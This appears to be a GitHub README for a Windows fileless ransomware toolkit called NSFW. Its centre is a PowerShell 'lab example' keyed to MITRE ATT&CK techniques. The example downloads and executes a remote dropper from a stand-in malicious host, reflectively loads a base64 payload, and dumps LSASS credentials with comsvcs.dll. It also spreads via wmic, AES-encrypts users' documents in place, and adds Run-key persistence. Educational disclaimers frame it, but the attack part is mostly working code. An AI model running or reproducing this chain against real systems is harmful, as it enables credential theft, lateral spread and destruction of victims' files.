
# NSFW: Fileless Polymorphic Hybrid Malware & LOLBins Research

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## 🧠 Summary: What Is NSFW?

NSFW (Net Sharing Fileless Wiperware) is a Windows focused malware dev:

- **Fileless malware**, which operates solely in memory to bypass traditional AV/EDR.
- **Polymorphic behavior**, making detection more difficult via mutation at runtime.
- **LOLBins (Living Off the Land Binaries)**, trusted system binaries leveraged for offensive operations without dropping executables on disk.

This toolkit helps simulate a realistic adversary kill chain using MITRE ATT&CK techniques, entirely fileless and stealthy in nature.

---

## 🔓 Fileless Ransomware Lab Example (LOLBins in Action)

> **Warning:** This is a synthetic simulation for red team research.  
> **Never run outside of an isolated test lab.**

```powershell
# Initial Access (T1190) - Load dropper via web
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution (T1059.001) - Decode & load payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (T1548)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access (T1003.001)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption (T1486)
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (T1547.001)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
````

---

## 🧭 Additional Resources

* [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
* [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
* [MITRE ATT\&CK: S0697](https://attack.mitre.org/software/S0697/)
* [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
* [Fileless Malware Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)

---

## ⚖️ Legal & Ethical Advisory

> 📢 **Important Notice:**
> This repository is for **educational and research purposes only**.
> You are responsible for complying with all local, national, and international laws when using any code or technique from this project.
>
> * Do **not** use NSFW for malicious activity.
> * Do **not** deploy in any production or unauthorized environment.
> * Use in **air-gapped**, **isolated**, and **sandboxed labs** only.
>
> **Violations of law or professional ethics are your liability.**



